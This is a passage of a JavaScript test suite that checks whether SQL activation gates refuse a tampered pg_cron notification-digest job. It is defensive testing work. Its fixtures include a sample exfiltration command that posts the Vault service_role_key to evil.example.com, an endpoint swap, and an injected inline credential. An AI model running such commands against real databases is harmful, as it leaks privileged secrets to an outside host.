  // detail that produces a fixture that is wrong by ten hours and still occasionally green — so the
  // choice is self-tested below against the real quiet-hours function rather than trusted.
  const middayTz = (() => {
    const o = 12 - new Date().getUTCHours();     // hours to ADD to UTC to land at 12:00 local
    return o === 0 ? 'UTC' : (o > 0 ? `Etc/GMT-${o}` : `Etc/GMT+${-o}`);
  })();
  {
    const r = (await c.query(
      `SELECT public.notif_digest_quiet_hours_bump(now(), $1) = now() AS open_now,
              public.notif_digest_quiet_hours_bump(now() + interval '5 minutes', $1)
                = now() + interval '5 minutes' AS open_soon,
              extract(hour FROM now() AT TIME ZONE $1)::int AS local_hour`, [middayTz])).rows[0];
    rec(`the due-work fixtures use a timezone where quiet hours are open (${middayTz}, local hour ${r.local_hour})`,
      r.open_now === true && r.open_soon === true,
      `open_now=${r.open_now} open_soon=${r.open_soon} — every canary PASS scenario would be wall-clock flaky`);
  }

  // ONE due, claimable cutover GROUP: exactly what the floor demands and nothing more. State
  // pending, unlocked, available now, non-terminal, no members at all (so the activation-boundary
  // NOT EXISTS is satisfied outright), and a zone in which quiet hours are open.
  const DUE_GROUP = '11111111-1111-4111-8111-111111111111';
  const seedDueCutoverGroup = async (id = DUE_GROUP) => c.query(`
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
    VALUES ('${id}', jsonb_build_object('due', '${id}'), 'hash-due-${id}', 'email',
            'open_slots_player', 'rk-due-${id}', 'fp-due-${id}', '${middayTz}', now(), now(), 'pending')`);

  // ...and the FORMING half of the same floor: one ungrouped pending digest member the same run
  // would materialize into a group and send. Its created_at/occurred_at are now(), which is after
  // the email:digest boundary this suite opened earlier, and digest_boundary_at is due.
  const seedDueCutoverMember = async (suffix = 'due-1') => c.query(`
    INSERT INTO public.notification_outbox
      (event_type, channel, recipient_person_id, idempotency_key, status, delivery_mode,
       digest_boundary_at, recipient_timezone)
    VALUES ('open_slots_player', 'email', gen_random_uuid(), 'idem-${suffix}', 'pending', 'digest',
            now(), '${middayTz}')`);

  // A scenario mutates ONE fact and must be REFUSED. `needle` pins which
  // assertion did the refusing, so a scenario cannot pass by failing elsewhere —
  // the trap that makes a red test look like a working guard.
  const refuses = async (name, mutate, needle) => {
    await seedBaseline();
    // A mutation that cannot even be applied would otherwise abort the whole
    // run, or — worse — leave the baseline in place and let the scenario "pass"
    // for a reason that has nothing to do with the thing under test.
    try { await mutate(); }
    catch (e) { return rec(name, false, `the scenario's own setup failed: ${e.message}`); }
    const err = await preflight();
    if (!err) return rec(name, false, 'the preflight PASSED — the gate does not cover this');
    rec(name, err.includes(needle), err.includes(needle) ? '' : `refused for the wrong reason: ${err}`);
  };

  // postflight's own refusal helper: same shape as `refuses`, different artifact
  const refusesPostflight = async (name, mutate, needle) => {
    await seedBaseline();
    try { await mutate(); }
    catch (e) { return rec(name, false, `the scenario's own setup failed: ${e.message}`); }
    const err = (await runArtifact('postflight.sql', { window_minutes: 60 })).err ?? null;
    if (!err) return rec(name, false, 'postflight PASSED — it does not cover this');
    rec(name, err.includes(needle), err.includes(needle) ? '' : `refused for the wrong reason: ${err}`);
  };

  console.log('\n10c-b G — activation_preflight.sql against a real PostgreSQL\n');

  // ── the baseline must PASS, or every refusal below is meaningless ────────
  await seedBaseline();
  {
    const err = await preflight();
    rec('a clean, fresh, delivering canary PASSES the preflight', err === null, err ?? '');
  }
  {
    const err = await canaryVerify();
    rec('...and passes canary_verify too', err === null, err ?? '');
  }

  // ── N4 seam: the two gates the admin surface added to activation ─────────
  // Neither is reachable from the vitest preflight suite (it reads the SQL as text) nor from the
  // invocation realpg suite (which scopes itself to section 8), so this is their only EXECUTING
  // proof — the gap that let the artifacts drift from the migrations in the first place.
  await refuses('activation is refused while a CHANNEL KILL is active',
    () => c.query(
      `INSERT INTO public.notification_channel_kill_switches (channel, reason, request_id)
       VALUES ('email', 'incident in progress', gen_random_uuid())`),
    'no notification channel is killed');

  // ── finding 1: the job must be THE REVIEWED JOB ──────────────────────────
  await refuses('a DRIFTED SCHEDULE is refused',
    () => c.query(`UPDATE cron.job SET schedule = '*/1 * * * *'`),
    'the cron schedule is the reviewed one');

  await refuses('a job bound to ANOTHER DATABASE is refused',
    () => c.query(`UPDATE cron.job SET database = 'some_other_db'`),
    'the cron job runs in THIS database');

  // pg_cron dispatches to (nodename, nodeport). A re-pointed node executes the reviewed command —
  // hash and all — against a different server entirely, so every other assertion still passes.
  await refuses('a job re-pointed to another NODENAME is refused',
    () => c.query(`UPDATE cron.job SET nodename = 'replica.internal'`),
    'executes on THIS node');

  await refuses('a job re-pointed to another NODEPORT is refused',
    () => c.query(`UPDATE cron.job SET nodeport = nodeport + 1`),
    'executes on THIS port');

  await refuses('a command posting to a DIFFERENT ENDPOINT is refused',
    () => c.query(`UPDATE cron.job SET command = replace(command,
      'https://ficwbdrzefmblkbkomzw.supabase.co/functions/v1/notification-digest-worker',
      'https://evil.example.com/collect')`),
    'the cron command posts to the reviewed notification-digest-worker endpoint');

  // The exfiltration shape: the reviewed post still happens, so the endpoint
  // check above passes — and a SECOND post ships the same Vault bearer away.
  await refuses('a command with a SECOND url (bearer exfiltration) is refused',
    () => c.query(`UPDATE cron.job SET command = command ||
      $x$ SELECT net.http_post(url := 'https://evil.example.com/collect',
        headers := jsonb_build_object('Authorization', 'Bearer ' ||
          (SELECT decrypted_secret FROM vault.decrypted_secrets WHERE name = 'service_role_key')));$x$`),
    'names NO url other than the reviewed endpoint');

  // Deliberately KEEPS the Vault read and adds a hard-coded "fallback" beside it
  // — the plausible shape, and the one that isolates this detector. Replacing the
  // Vault read outright would trip the tick-time-Vault assertion first, and the
  // scenario would look green while proving nothing about inline credentials.
  //
  // The subquery is EXTRACTED FROM THE REVIEWED COMMAND rather than retyped. A hand-copied literal
  // stopped matching the moment the command's `=` was qualified, so `replace()` changed nothing and
  // the scenario reported that the gate "does not cover this" — a scenario silently testing an
  // unmutated world is the exact trap this suite exists to avoid.
  const VAULT_READ = (() => {
    const m = REVIEWED.command.match(/\(SELECT decrypted_secret FROM vault\.decrypted_secrets WHERE [^)]*\)/);
    if (!m) throw new Error('the reviewed command no longer reads the Vault secret in the expected form');
    return m[0];
  })();
  await refuses('a command carrying an INLINE CREDENTIAL beside the Vault read is refused',
    () => c.query(`UPDATE cron.job SET command = replace(command, $find$${VAULT_READ}$find$,
      $repl$coalesce(${VAULT_READ}, 'eyJhbGciOiJIUzI1NiJ9.injected.signature')$repl$)`),
    'contains NO inline credential');

  await refuses('any other command drift is refused by the whole-text check',
    () => c.query(`UPDATE cron.job SET command = command || ' -- harmless looking trailing comment'`),
    'EXACTLY the reviewed command');

  await refuses('a job owned by ANOTHER ROLE does not satisfy the check',
    () => c.query(`UPDATE cron.job SET username = 'someone_else'`),
    'the digest cron job exists');

  await refuses('an ALREADY ARMED job is refused',
    () => c.query(`UPDATE cron.job SET active = true`),
    'still INACTIVE');

  // ── finding 3: activation is bound to THIS canary ────────────────────────
  await refuses('a canary that did not SUCCEED is refused',
    () => c.query(`UPDATE public.notification_worker_runs SET status = 'failed' WHERE run_id = '${RUN}'`),
    'the canary run SUCCEEDED');

  await refuses('a canary still IN FLIGHT is refused',
    () => c.query(`UPDATE public.notification_worker_runs SET ended_at = NULL WHERE run_id = '${RUN}'`),
    'the canary run has FINISHED');

  await refuses('a NEWER dispatch run than the named canary is refused',
    () => c.query(`INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at, ended_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', 'failed',
              now() - interval '1 minute', now())`),
    'in flight, started after, or ended after this canary');

  await refuses('a dispatch run IN FLIGHT alongside the canary is refused',
    () => c.query(`INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', NULL, now())`),
    'in flight, started after, or ended after this canary');

  // ORDERING BY COMPLETION HAS A HOLE. A run that STARTED after the canary and failed FAST — so it
  // also ENDED before the canary did — is newer by invocation and invisible to an ended_at
  // comparison. This is the scenario that made the ordering wrong, so it is pinned explicitly.
  await refuses('a run that STARTED after the canary but ended BEFORE it is refused',
    () => c.query(`INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at, ended_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', 'failed',
              now() - interval '2 minutes 30 seconds', now() - interval '2 minutes 10 seconds')`),
    'in flight, started after, or ended after this canary');

  await refuses('a canary older than the freshness window is refused',
    () => c.query(`UPDATE public.notification_worker_runs
      SET started_at = now() - interval '9 hours', ended_at = now() - interval '8 hours'
      WHERE run_id = '${RUN}'`),
    'within the last 6 hours');

  // THE ORIGINAL DEFECT, directly: evidence from an earlier rollout must not
  // license this activation. The accepted attempt and the sent group exist —
  // they just belong to a different run.
  await refuses('an ACCEPTED ATTEMPT FROM ANOTHER RUN is not this canary\'s evidence',
    () => c.query(`UPDATE public.notification_digest_attempts
      SET worker_run_id = NULL WHERE attempt_id = '${ATTEMPT}'`),
    'at least one ACCEPTED send attempt');

  await refuses('a group this canary never attempted does not count as delivered',
    () => c.query(`
      WITH g AS (
        INSERT INTO public.notification_digest_groups
          (canonical_group_key, group_key_hash, channel, event_type, recipient_key,
           destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
        VALUES ('{"k":2}'::jsonb, 'hash-2', 'email', 'open_slots_player', 'rk-2', 'fp-2',
                'Europe/Amsterdam', now(), now(), 'no_work') RETURNING id)
      UPDATE public.notification_digest_attempts a
         SET digest_group_id = (SELECT id FROM g)
       WHERE a.attempt_id = '${ATTEMPT}'`),
    'reached sent');

  // ── finding 4: `accepted` is not proof of a clean send ───────────────────
  // The exact production shape: record_notification_digest_result writes the
  // attempt as accepted BEFORE noticing the group is bound to a different
  // provider message, then manual-holds the channel and RETURNS
  // 'correlation_mismatch'. The worker reads that return now and fails the run —
  // but the attempt row still reads `accepted`, so every assertion above is
  // satisfied and these SQL checks are what see it from the ledger's side.
  await refuses('an ACCEPTED attempt over a CORRELATION MISMATCH is refused',
    () => c.query(`UPDATE public.notification_digest_attempts
      SET provider_message_id = 'resend-msg-DIFFERENT' WHERE attempt_id = '${ATTEMPT}'`),
    'disagrees with its group about the provider message id');

  await refuses('a global_config ledger event for this canary is refused',
    () => c.query(`INSERT INTO public.notification_digest_group_attempts
      (worker_run_id, digest_group_id, attempt_id, action)
      VALUES ('${RUN}', '${GROUP}', '${ATTEMPT}', 'global_config')`),
    'no global_config event');

  await refuses('an OPEN email circuit (the manual hold) is refused',
    () => c.query(`UPDATE public.notification_provider_circuit
      SET state = 'open', reason = 'correlation_mismatch', tripped_at = now(), retry_at = NULL
      WHERE channel = 'email'`),
    'circuit exists and is CLOSED');

  await refuses('a HALF-OPEN email circuit is refused',
    () => c.query(`UPDATE public.notification_provider_circuit
      SET state = 'half_open', reason = 'probing', tripped_at = now() WHERE channel = 'email'`),
    'circuit exists and is CLOSED');

  // A MISSING row is not "no problem". A real send ensures it exists, so absence after a canary
  // means the breaker state was lost or wiped — and counting only non-closed rows passed vacuously
  // on exactly that state.
  await refuses('a MISSING email circuit row is refused (absence is not health)',
    () => c.query(`DELETE FROM public.notification_provider_circuit WHERE channel = 'email'`),
    'circuit exists and is CLOSED');

  await seedBaseline();
  await c.query(`DELETE FROM public.notification_provider_circuit WHERE channel = 'email'`);
  {
    const err = await canaryVerify();
    rec('canary_verify ALSO refuses a missing email circuit row',
      !!err && err.includes('circuit exists and is CLOSED'), err ?? 'it PASSED');
  }

  // ── the pre-existing gates must still hold ───────────────────────────────
  await refuses('the engine being OFF is refused',
    () => c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false`),
    'the digest engine is enabled for open_slots_player');

  await refuses('a SECOND event with the engine enabled is refused',
    () => c.query(`INSERT INTO public.notification_event_types
      (key, supports_digest, digest_engine_enabled) VALUES ('session_reminder_player', true, true)`),
    'no event other than open_slots_player');

  await refuses('a group mid-send is refused',
    () => c.query(`INSERT INTO public.notification_digest_groups
      (canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      VALUES ('{"k":3}'::jsonb, 'hash-3', 'email', 'open_slots_player', 'rk-3', 'fp-3',
              'Europe/Amsterdam', now(), now(), 'sending')`),
    'no digest group is mid-send');

  // The webhook mismatch shape: apply_notification_provider_event takes the uncorrelated branch and
  // enrols an orphan with quarantined = FALSE, leaving the group `sent`, the circuit closed and the
  // run ledger untouched — so every other assertion passes and the first armed tick is what finds it.
  await refuses('an UNRECONCILED (not quarantined) orphan on this canary\'s group is refused',
    () => c.query(`
      INSERT INTO public.notification_provider_events
        (resend_event_id, provider_message_id, digest_group_id, status, occurred_at)
        VALUES ('evt-mismatch-1', 'resend-msg-SOMETHING-ELSE', NULL, 'delivered', now());
      INSERT INTO public.notification_orphan_reconcile_state
        (resend_event_id, channel, digest_group_id, next_eligible_at)
        VALUES ('evt-mismatch-1', 'email', '${GROUP}', now())`),
    'still unreconciled against a group this canary sent');

  // ...but an orphan against some OTHER group is the worker's own backlog to drain, not a reason to
  // block an activation. Without this the assertion above would just be "no orphans anywhere".
  await seedBaseline();
  await c.query(`
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      VALUES ('11111111-1111-4111-8111-111111111111', '{"k":9}'::jsonb, 'hash-9', 'email',
              'open_slots_player', 'rk-9', 'fp-9', 'Europe/Amsterdam', now(), now(), 'no_work');
    INSERT INTO public.notification_provider_events
      (resend_event_id, provider_message_id, digest_group_id, status, occurred_at)
      VALUES ('evt-other-1', 'resend-msg-OTHER', NULL, 'delivered', now());
    INSERT INTO public.notification_orphan_reconcile_state
      (resend_event_id, channel, digest_group_id, next_eligible_at)
      VALUES ('evt-other-1', 'email', '11111111-1111-4111-8111-111111111111', now())`);
  {
    const err = await preflight();
    rec('an orphan against an UNRELATED group does not block activation', err === null, err ?? '');
  }

  // On an UNRELATED group, so it is the global quarantine rule firing and not the canary-scoped
  // one above. quarantined = true also requires attempts > 0 and a reason, per the table's CHECKs.
  await refuses('a quarantined orphan is refused',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
        VALUES ('22222222-2222-4222-8222-222222222222', '{"k":8}'::jsonb, 'hash-8', 'email',
                'open_slots_player', 'rk-8', 'fp-8', 'Europe/Amsterdam', now(), now(), 'no_work');
      INSERT INTO public.notification_provider_events
        (resend_event_id, provider_message_id, digest_group_id, status, occurred_at)
        VALUES ('evt-quar-1', 'resend-msg-QUAR', NULL, 'bounced', now());
      INSERT INTO public.notification_orphan_reconcile_state
        (resend_event_id, channel, digest_group_id, attempts, last_error_code, quarantined)
        VALUES ('evt-quar-1', 'email', '22222222-2222-4222-8222-222222222222', 3, 'tagged_mismatch', true)`),
    'no orphan provider event is quarantined');

  // ── activate.sql: verify and arm, atomically ─────────────────────────────
  // The preflight proves what the world looked like at CHECK time. Arming in a separate statement
  // meant the job could be altered, replaced or deleted in between — and an arm-by-name matching
  // zero rows succeeds silently, so the tooling would report ARMED over a job that was gone.
  const activate = async () => (await runArtifact('activate.sql', { run_id: RUN })).err ?? null;
  // read on the SUPERUSER connection, so the owner is named rather than current_user'd
  const jobActive = async () =>
    (await c.query(`SELECT active FROM cron.job WHERE jobname='notification-digest-worker'
                     AND username='hosted_postgres'`)).rows[0]?.active ?? null;

  await seedBaseline();
  {
    const err = await activate();
    rec('activate ARMS the cron when every assertion passes', err === null, err ?? '');
    rec('...and the job really is active afterwards', (await jobActive()) === true);
  }

  // A FAILING assertion must leave the world untouched — that is what the transaction is for.
  await seedBaseline();
  await c.query(`UPDATE cron.job SET schedule = '*/1 * * * *'`);
  {
    const err = await activate();
    rec('activate REFUSES a drifted job', !!err && err.includes('the cron schedule is the reviewed one'),
      err ?? 'it armed the job');
    rec('...and the cron is STILL INACTIVE (the transaction rolled back)', (await jobActive()) === false);
  }

  // ── round 4: E1 of the ownership contract, executed ──────────────────────
  // Ownership of the run a deliberate invocation causes is proven by EXCLUSION, and its first
  // term is "no tick can be dispatched during this window": both invoke artifacts lock the
  // reviewed cron.job row and refuse an ACTIVE job BEFORE they open anything. If that ever
  // regressed, the invocation record would go on claiming a causality it no longer has — and no
  // DB-side check can recover it, which is exactly why 'manual' was removed instead of patched.
  for (const [what, run] of [['canary_invoke', canaryInvoke], ['smoke_invoke', smokeInvoke]]) {
    await seedBaseline();
    await c.query(`UPDATE cron.job SET active = true`);
    const err = await run();
    rec(`${what} REFUSES to open an invocation while the cron job is ACTIVE`,
      !!err && err.includes('INACTIVE'), err ?? 'it opened an invocation anyway');
    rec(`...and no invocation row was left behind by ${what}`,
      (await c.query(`SELECT count(*)::int n FROM public.notification_worker_invocations WHERE status IN ('pending','started')`)).rows[0].n === 0);
  }

  // The kill scenario above proves the PREFLIGHT refuses. Arming is the act that matters, so it
  // is proven at the arming artifact too — including that the cron is still inactive afterwards.
  await seedBaseline();
  await c.query(
    `INSERT INTO public.notification_channel_kill_switches (channel, reason, request_id)
     VALUES ('email', 'incident in progress', gen_random_uuid())`);
  {
    const err = await activate();
    rec('activate REFUSES while a CHANNEL KILL is active',
      !!err && err.includes('no notification channel is killed'), err ?? 'it armed the job');
    rec('...and the cron is STILL INACTIVE after the kill refusal', (await jobActive()) === false);
  }

  // N4 M1: the STRICT invocation gate lives in activate.sql, not in the preflight — arming must
  // never ride over an evidence window at all, including a smoke opened after the canary was
  // reconciled (the sequence's own next step, and the one an operator is most likely to overlap).
  await seedBaseline();
  await c.query(`SELECT public.open_notification_worker_invocation('smoke', 'smoke_invoke.sql', gen_random_uuid())`);
  {
    const err = await activate();
    rec('activate REFUSES while a deliberate invocation is UNRESOLVED',
      !!err && err.includes('a deliberate worker invocation is UNRESOLVED'), err ?? 'it armed the job');
    rec('...and the cron is STILL INACTIVE after that refusal', (await jobActive()) === false);
  }

  await seedBaseline();
  await c.query(`UPDATE public.notification_worker_runs SET status = 'failed' WHERE run_id = '${RUN}'`);
  {
    const err = await activate();
    rec('activate REFUSES a canary that did not succeed', !!err && err.includes('the canary run SUCCEEDED'),
      err ?? 'it armed the job');
    rec('...and armed nothing', (await jobActive()) === false);
  }

  // THE SILENT NO-OP. Arming by name when the job has been unscheduled matches zero rows and
  // SUCCEEDS — the failure that made the old flow report a cron it had not armed.
  await seedBaseline();
  await c.query(`DELETE FROM cron.job`);
  {
    const err = await activate();
    rec('activate FAILS LOUDLY when the job has vanished (never a silent no-op)',
      !!err && err.includes('the digest cron job exists'), err ?? 'it reported success over a missing job');
  }

  // ── the locks, proven with a SECOND connection ───────────────────────────
  // Everything above runs on one client, so it can show that a refused activation rolls back but
  // NOT that the locks exclude anything. The lock statements are read out of the SHARED include
  // (_gate_job_lock.sql) and activate.sql rather than retyped, so deleting or reshaping them there
  // fails these outright instead of quietly testing a lock the gate no longer takes.
  const activateSrc = readFileSync(join(SQL_DIR, 'activate.sql'), 'utf8');
  const gateLockSrc = readFileSync(join(SQL_DIR, '_gate_job_lock.sql'), 'utf8');
  const assertHelpers = readFileSync(
    join(SQL_DIR, '..', '..', 'notif-10ca3', 'sql', '_assert.sql'), 'utf8').replace(/^\\.*$/gm, '');
  const tableLock = activateSrc.match(/^LOCK TABLE [^\n]+;$/m)?.[0];
  const resolveStmt = gateLockSrc.match(/CREATE TEMP TABLE _gate_job AS[\s\S]*?;/)?.[0];
  const lockStmt = gateLockSrc.match(
    /SELECT pg_temp\.assert_eq\(\s*\(SELECT count\(\*\)::int FROM \(\s*SELECT cron\.alter_job[\s\S]*?'\);/)?.[0];
  const writeProof = gateLockSrc.match(
    /SELECT pg_temp\.assert\(\s*\(SELECT j\.xmin = pg_current_xact_id\(\)::xid[\s\S]*?'\);/)?.[0];

  await seedBaseline();
  const other = conn();   // the boot SUPERUSER — the out-of-band writer every race here needs
  await other.connect();
  try {
    rec('activate.sql still takes a table lock on the run ledger', !!tableLock,
      tableLock ? '' : 'no LOCK TABLE statement in activate.sql');
    rec('the shared include still resolves _gate_job', !!resolveStmt,
      resolveStmt ? '' : 'no _gate_job resolve in _gate_job_lock.sql');
    rec('the shared include still locks through a guarded no-op cron.alter_job', !!lockStmt,
      lockStmt ? '' : 'no guarded alter_job lock statement in _gate_job_lock.sql');
    rec('the shared include still proves the lock write really happened', !!writeProof,
      writeProof ? '' : 'no xmin write-proof in _gate_job_lock.sql');
    for (const a of ['activate.sql', 'canary_invoke.sql', 'smoke_invoke.sql', 'enable_engine.sql']) {
      rec(`${a} takes the shared job-row lock include`,
        /^\\i _gate_job_lock\.sql\s*$/m.test(readFileSync(join(SQL_DIR, a), 'utf8')),
        '');
    }

    // Drives the include's OWN statements stepwise on the RESTRICTED connection, so a writer can be
    // interleaved between them — the race a single-shot artifact run cannot exhibit.
    const opGate = async () => {
      await op.query('BEGIN');
      await op.query(assertHelpers);
      await op.query(`DROP TABLE IF EXISTS pg_temp._gate_job`);
      await op.query(resolveStmt);
    };

    if (tableLock && resolveStmt && lockStmt && writeProof) {
      // (a) GATE LOCKS FIRST: every cron-API writer queues behind the held tuple lock.
      await opGate();
      await op.query(lockStmt);
      await op.query(writeProof);
      await other.query(`SET lock_timeout = '600ms'`);
      let blocked = false;
      try { await other.query(`UPDATE cron.job SET schedule = '*/9 * * * *'`); }
      catch (e) { blocked = e.code === '55P03'; }          // lock_not_available
      rec('the alter_job row lock BLOCKS a concurrent direct change to that job', blocked,
        blocked ? '' : 'another session altered the job while the gate held it');
      let alterBlocked = false;
      try {
        await other.query(`SELECT cron.alter_job(
          (SELECT jobid FROM cron.job WHERE jobname = 'notification-digest-worker'), active := true)`);
      } catch (e) { alterBlocked = e.code === '55P03'; }
      rec('...and BLOCKS a concurrent arm through the cron API itself', alterBlocked,
        alterBlocked ? '' : 'another session armed the job through alter_job while the gate held it');
      await op.query('ROLLBACK');
      await other.query(`ROLLBACK`).catch(() => {});
      // The rolled-back gate wrote nothing durable: the job row is exactly as seeded.
      const after = await c.query(
        `SELECT active FROM cron.job WHERE jobname = 'notification-digest-worker'`);
      rec('...and a rolled-back gate leaves the job untouched', after.rows[0]?.active === false,
        `active=${after.rows[0]?.active}`);

      // (b) WRITER WINS THE RESOLVE→LOCK WINDOW WITH AN ARM: the lock statement's own snapshot sees
      // the armed row, matches nothing, calls alter_job for nothing, and REFUSES — the arm is left
      // in place for the operator, never silently overwritten. (The residual the include documents
      // is strictly narrower: a commit landing INSIDE the lock statement's execution.)
      await seedBaseline();
      await opGate();
      await other.query(`UPDATE cron.job SET active = true WHERE jobname = 'notification-digest-worker'`);
      let armRefusal = null;
      try { await op.query(lockStmt); } catch (e) { armRefusal = e.message; }
      rec('an arm committed between resolve and lock is REFUSED, not overwritten',
        !!armRefusal && armRefusal.includes('or is ARMED'),
        armRefusal ?? 'the gate proceeded over a freshly armed job');
      await op.query('ROLLBACK');
      const armLeft = await c.query(
        `SELECT active FROM cron.job WHERE jobname = 'notification-digest-worker'`);
      rec('...and the out-of-band arm is still visible to the operator', armLeft.rows[0]?.active === true,
        `active=${armLeft.rows[0]?.active}`);

      // (c) JOB REPLACED in that window — deleted and re-created byte-identical under a NEW jobid.
      // Identity of content does not transfer the lock: the resolved jobid is gone, and the gate
      // must refuse rather than adopt the newcomer.
      await seedBaseline();
      await opGate();
      await other.query(`DELETE FROM cron.job WHERE jobname = 'notification-digest-worker'`);
      await other.query(
        `INSERT INTO cron.job (jobname, schedule, command, active, username)
           VALUES ('notification-digest-worker', $1, $2, false, 'hosted_postgres')`,
        [REVIEWED.schedule, REVIEWED.command]);
      let replRefusal = null;
      try { await op.query(lockStmt); } catch (e) { replRefusal = e.message; }
      rec('a job REPLACED under a new jobid between resolve and lock is REFUSED',
        !!replRefusal && replRefusal.includes('replaced under a new jobid'),
        replRefusal ?? 'the gate adopted a row it never resolved');
      await op.query('ROLLBACK');

      // (d) JOB DELETED in that window, nothing re-created: same refusal, nothing invoked.
      await seedBaseline();
      await opGate();
      await other.query(`DELETE FROM cron.job WHERE jobname = 'notification-digest-worker'`);
      let goneRefusal = null;
      try { await op.query(lockStmt); } catch (e) { goneRefusal = e.message; }
      rec('a job DELETED between resolve and lock is REFUSED',
        !!goneRefusal && goneRefusal.includes('the job vanished'),
        goneRefusal ?? 'the gate locked a row that no longer exists');
      await op.query('ROLLBACK');

      // (e) OWNER CHANGED in that window (superuser-only action): the row still qualifies on the
      // gate's own predicate, so the refusal comes from pg_cron's ownership check inside alter_job
      // — the API's error, and still fail-closed.
      await seedBaseline();
      await opGate();
      await other.query(
        `UPDATE cron.job SET username = 'someone_else' WHERE jobname = 'notification-digest-worker'`);
      let ownRefusal = null;
      try { await op.query(lockStmt); } catch (e) { ownRefusal = e.message; }
      rec('an ownership change between resolve and lock is REFUSED by alter_job itself',
        !!ownRefusal && ownRefusal.includes("don't own it"),
        ownRefusal ?? 'the gate locked a job the role no longer owns');
      await op.query('ROLLBACK');

      // (f) ...and the run-ledger table lock must exclude a new dispatch run starting mid-activation,
      // which is what makes "this canary is still the newest run" true at COMMIT, not merely at
      // check time.
      await seedBaseline();
      await op.query('BEGIN');
      await op.query(tableLock);
      await other.query(`SET lock_timeout = '600ms'`);
      let runBlocked = false;
      try {
        await other.query(`INSERT INTO public.notification_worker_runs
          (worker, channel, phase, status) VALUES ('x', 'email', 'dispatch', NULL)`);
      } catch (e) { runBlocked = e.code === '55P03'; }
      rec('the run-ledger lock BLOCKS a new dispatch run starting mid-activation', runBlocked,
        runBlocked ? '' : 'a new worker run was inserted while activation was deciding');
      await op.query('ROLLBACK');
      await other.query(`ROLLBACK`).catch(() => {});
    }

    // The canary's GROUPS must be frozen too. A Resend callback needs no worker run — it passes a
    // null run id — so a bounce arriving after "this canary delivered" has passed can move the
    // group out of `sent` before the transaction commits the cron as active.
    const groupLock = activateSrc.match(/SELECT g\.id FROM public\.notification_digest_groups[\s\S]*?FOR SHARE;/)?.[0];
    rec('activate.sql still locks the canary\'s groups FOR SHARE', !!groupLock,
      groupLock ? '' : 'no FOR SHARE on the canary groups in activate.sql');
    if (groupLock) {
      await seedBaseline();
      await op.query('BEGIN');
      await op.query(groupLock.split(":'run_id'").join(`'${RUN}'`));
      await other.query(`SET lock_timeout = '600ms'`);
      let groupBlocked = false;
      try {
        await other.query(
          `UPDATE public.notification_digest_groups SET state = 'failed_terminal' WHERE id = '${GROUP}'`);
      } catch (e) { groupBlocked = e.code === '55P03'; }
      rec('the canary-group lock BLOCKS a webhook re-stating the group mid-activation', groupBlocked,
        groupBlocked ? '' : 'a callback changed the canary group while activation was deciding');
      await op.query('ROLLBACK');
      await other.query(`ROLLBACK`).catch(() => {});
    }
    // enable-engine's OWN race — reading job_active and enabling the event in a later statement,
    // while a concurrent arm commits in between — is closed by the SAME shared lock include now,
    // whose blocking behaviour is proven in (a) above; that it takes the include at all is pinned
    // in the four-artifact loop.

    // THE EARLY IN-FLIGHT REFUSAL, observed through a FULL activation under contention. The
    // in-flight run is also caught by the shared assertions, so a scenario without contention
    // cannot tell the early check from the late one. Here another session holds a canary group:
    // with the early refusal, activation fails FAST naming the in-flight run; without it,
    // activation reaches the group lock and dies on lock_timeout (55P03) instead.
    await seedBaseline();
    await c.query(`INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', NULL, now())`);
    await other.query('BEGIN');
    await other.query(`SELECT id FROM public.notification_digest_groups WHERE id = '${GROUP}' FOR UPDATE`);
    {
      const err = await activate();
      rec('activation refuses an in-flight run BEFORE queueing on a held canary group',
        !!err && err.includes('no dispatch run is in flight'),
        err ?? 'it armed the cron while a run was in flight');
      rec('...and did not die on the lock instead',
        !!err && !err.includes('lock timeout') && !err.includes('canceling statement'), err ?? '');
    }
    await other.query('ROLLBACK');
  } finally {
    await other.end().catch(() => {});
  }

  // ── the lock primitive's own failure modes ───────────────────────────────
  // A pg_cron that quietly SKIPS a value-identical update would leave every later assertion
  // running with no lock held and every check green. The include's xmin write-proof is what
  // notices, and this is its mutation pin: alter_job replaced by an invoked-but-writes-nothing
  // body must be refused.
  await seedBaseline();
  await c.query(`
    CREATE OR REPLACE FUNCTION cron.alter_job(job_id bigint, schedule text DEFAULT NULL,
        command text DEFAULT NULL, database text DEFAULT NULL, username text DEFAULT NULL,
        active boolean DEFAULT NULL)
      RETURNS void LANGUAGE plpgsql SECURITY DEFINER AS $fn$
      BEGIN RETURN; END $fn$;`);
  {
    const err = await canaryInvoke();
    rec('an alter_job that skips the identical write is REFUSED by the write-proof',
      !!err && err.includes('really wrote'), err ?? 'the invocation proceeded with no lock held');
  }
  await c.query(MOCK_ALTER_JOB);   // restore the measured semantics

  // An unreviewed pg_cron line must stop the rollout for re-review BEFORE any lock is attempted —
  // the lock's semantics are measured properties of 1.6.x, not an API contract.
  await seedBaseline();
  await c.query(`UPDATE pg_extension SET extversion = '1.7.0' WHERE extname = 'pg_cron'`);
  {
    const err = await canaryInvoke();
    rec('an unreviewed pg_cron version is REFUSED before any lock is attempted',
      !!err && err.includes('reviewed 1.6.x'), err ?? 'it proceeded on an unreviewed pg_cron');
  }
  await c.query(`UPDATE pg_extension SET extversion = '1.6.4' WHERE extname = 'pg_cron'`);

  // A job owned by ANOTHER role never resolves (the resolve is owner-scoped), so a transactional
  // artifact refuses at the include's own exists-check.
  await seedBaseline();
